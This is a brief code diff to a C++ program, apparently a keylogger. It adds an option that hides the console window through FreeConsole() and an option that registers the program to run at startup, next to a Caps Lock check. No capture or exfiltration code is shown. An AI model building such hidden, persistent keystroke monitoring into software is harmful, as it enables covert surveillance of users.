@@ -7,8 +7,12 @@
 using namespace std;
 
 int main(int argc, char *argv[]) {
-	if(VISIBLE == 0) {
+	if(INVISIBLE == 1) {
 		FreeConsole();
+	}
+	if (RUN_AT_STARTUP == 1) {
+
+		registerProgram();
 	}
 
 	bool capsLock = isCapsLock(); // If the low-order bit is 1, the key is toggled
